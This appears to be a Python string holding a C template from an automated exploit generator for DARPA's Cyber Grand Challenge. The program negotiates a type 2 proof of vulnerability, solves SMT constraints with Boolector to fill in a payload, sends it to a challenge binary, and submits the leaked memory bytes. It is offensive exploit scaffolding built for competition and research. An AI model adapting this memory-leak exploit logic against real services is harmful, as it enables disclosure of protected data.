c_template = """
#include <libcgc.h>
#include <stdlib.h>
#include <string.h>
#include <boolector.h>

enum register_t
{
    eax = 0,
    ecx = 1,
    edx = 2,
    ebx = 3,
    esp = 4,
    ebp = 5,
    esi = 6,
    edi = 7
};

int fd_ready(int fd) {
  struct timeval tv;
  fd_set rfds;
  int readyfds = 0;

  FD_SET(fd, &rfds);

  tv.tv_sec = 1;
  tv.tv_usec = 0;

  int ret;
  ret = fdwait(fd + 1, &rfds, NULL, &tv, &readyfds);

  /* bail if fdwait fails */
  if (ret != 0) {
    return 0;
  }
  if (readyfds == 0)
    return 0;

  return 1;
}

void die(char *str) { 
  transmit(2, str, strlen(str), NULL);
  _terminate(1);
}

unsigned int bswap32(unsigned int x) {
    return (((x) & 0x000000ff) << 24) | (((x) & 0x0000ff00) << 8) | \
        (((x) & 0x00ff0000) >> 8) | (((x) & 0xff000000) >> 24);
}

// receive into no particular buffer
size_t blank_receive( int fd, size_t n_bytes )
{
  size_t len = 0;
  size_t rx = 0;
  char junk_byte;

  while (len < n_bytes) {
    if (!fd_ready(fd)) {
        return len;
    }
    if (receive(fd, &junk_byte, 1, &rx) != 0) {
      len = 0;
      break;
    }
    len += rx;
  }

  return len;
}

size_t receive_n( int fd, unsigned char *dst, size_t n_bytes )
{
  size_t len = 0;
  size_t rx = 0;
  while(len < n_bytes) {
    if (receive(fd, dst + len, n_bytes - len, &rx) != 0) {
      len = 0;
      break;
    }
    len += rx;
  }

  return len;
}

int send_all(int fd, const void *msg, size_t n_bytes)
{
  size_t len = 0;
  size_t tx = 0;
  while(len < n_bytes) {
    if (transmit(fd, (char *)msg + len, n_bytes - len, &tx) != 0) {
      return 1;
    }
    len += tx;
  }
  return 0;
}

char to_char(char *str) {
  int i;
  char r = '\\0';

  if (strlen(str) != 8)
    die("bv_assignment returned a string not of length 8\\n");

  /* result can '0', '1' or 'x', if 'x' just 0 */
  for(i=0;i<8;i++)
    r |= ((str[7-i] - '0') & 1) << i;

  return r;
}

typedef struct type1_vals_ {
   unsigned int ipval;
   unsigned int regval;
} type1_vals;

typedef struct type2_vals_ {
   unsigned int region_addr;
   unsigned int region_size;
   unsigned int read_size;
} type2_vals;


/*
 * Negotiate a type 1 pov. Caller specifies an ip bit mask, a register bit mask
 * and a general purpose register number (see the list below).
 *
   0 - eax
   1 - ecx
   2 - edx
   3 - ebx
   4 - esp
   5 - ebp
   6 - esi
   7 - edi
 *
 * Returns 0 on success. On success, the t1vals structure holds required IP
 * and register values that must be found when the target CB crashes. At the
 * time of the crash the following must hold:
 *  (crash_eip & ipmask) == t1vals->ipval
 *  (crash_REG & regmask) == t1vals->regval
 */
int type1_negotiate(unsigned int ipmask, unsigned int regmask, unsigned int regnum, type1_vals *t1vals) {
   uint32_t povType = 1;
   if (send_all(3, &povType, sizeof(povType)) ||
       send_all(3, &ipmask, sizeof(ipmask)) ||
       send_all(3, &regmask, sizeof(regmask)) ||
       send_all(3, &regnum, sizeof(regnum))) {
      return -1;
   }
   if (receive_n(3, (unsigned char *)t1vals, sizeof(type1_vals)) != sizeof(type1_vals)) {
      return -1;
   }
   return 0;
}

/*
 * Negotiate a type 2 pov.
 * Returns 0 on success. On success, the t2vals structure holds the address
 * (t2vals->region_addr) and size of a memory region (t2vals->region_size)
 * from which the POV must leak a specific number of bytes (t2vals->read_size).
 */
int type2_negotiate(type2_vals *t2vals) {
   uint32_t povType = 2;
   if (send_all(3, &povType, sizeof(povType))) {
      return -1;
   }
   if (receive_n(3, (unsigned char *)t2vals, sizeof(type2_vals)) != sizeof(type2_vals)) {
      return -1;
   }
   return 0;
}

/*
 * Submit the len bytes in the val buffer as the results of a type 2 POV
 * Returns 0 on success
 */
int type2_submit(const unsigned char *val, size_t len) {
   return send_all(3, val, len);
}


int main() {
  type2_vals t2vals;

  if (type2_negotiate(&t2vals) != 0) {
    _terminate(0);
  }

  Btor *btor = boolector_new();

  boolector_set_opt(btor, "model_gen", 1);

  char *error;
  int status;
  const char *smt_stmt = {smt_stmt};

  boolector_parse(btor, smt_stmt, &error, &status);
  if (error)
    die(error);
   
  BoolectorNode *address_val_var = boolector_match_node_by_id(btor, {address_var_idx});
  BoolectorNode *length_val_var = boolector_match_node_by_id(btor, {length_var_idx});

  BoolectorNode *address_val = boolector_int(btor, t2vals.region_addr, 32);
  BoolectorNode *upper_val = boolector_int(btor, (t2vals.region_addr + t2vals.region_size) - t2vals.read_size, 32);
  BoolectorNode *min_length_val = boolector_int(btor, t2vals.read_size, 32);
  BoolectorNode *max_length_val = boolector_int(btor, 0x1000, 32);

  BoolectorNode *min_con = boolector_ugte(btor, address_val_var, address_val);
  BoolectorNode *max_con = boolector_ulte(btor, address_val_var, upper_val);
  BoolectorNode *min_length_con = boolector_ugte(btor, length_val_var, min_length_val);
  BoolectorNode *max_length_con = boolector_ulte(btor, length_val_var, max_length_val);

  boolector_assert(btor, min_con);
  boolector_assert(btor, max_con);
  boolector_assert(btor, min_length_con);
  boolector_assert(btor, max_length_con);

  if (boolector_sat(btor) != 10)
    die("unsat\\n");

  char payload[] = "{raw_payload}";

  BoolectorNode *cur_byte;

  {byte_setting_code}

  send_all(1, payload, {payload_len});

  // discard output
  blank_receive(0, {output_leak_idx});

  unsigned char leak[0x1000];
  unsigned n = t2vals.read_size < sizeof(leak) ? t2vals.read_size : sizeof(leak);
  receive_n(0, leak, n);

  type2_submit(leak, t2vals.read_size);

  return 0;
}

"""
